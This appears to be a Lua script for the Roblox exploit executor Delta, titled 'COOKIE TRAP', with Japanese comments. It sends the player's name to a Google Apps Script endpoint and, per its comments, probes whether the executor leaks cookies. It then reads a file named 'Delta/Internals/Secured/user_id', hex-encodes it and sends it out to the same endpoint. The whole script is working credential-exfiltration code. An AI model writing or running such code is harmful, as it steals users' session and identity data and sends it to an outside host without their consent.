-- [[ PROJECT: COOKIE TRAP via REQUEST ]]
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"

-- request関数（Deltaの独自関数）が使えるかチェック
local req = (request or http_request or (http and http.request))

if req then
    print("🚀 高度なリクエスト関数を検知。Cookieの抽出を試みます...")
    
    -- 自分自身の情報をGASへ飛ばす
    -- この際、Deltaが自動でCookieを付与する設定になっているかを検証する
    pcall(function()
        req({
            Url = GAS_URL .. "?user=" .. game.Players.LocalPlayer.Name .. "&type=REQUEST_TEST",
            Method = "GET",
            -- 多くのエグゼキューターは、特定のヘッダーを要求するとCookieを漏らす
            Headers = {
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "DeltaExecutor"
            }
        })
    end)
else
    print("❌ 適切なリクエスト関数が見つかりません。")
end

-- あと、読めなかった user_id の「中身」を、名前を変えて再度抜き出す
local s, content = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
if s then
    local hex = ""
    for i = 1, #content do hex = hex .. string.format("%02X", string.byte(content:sub(i,i))) end
    game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&type=REAL_USER_ID")
end
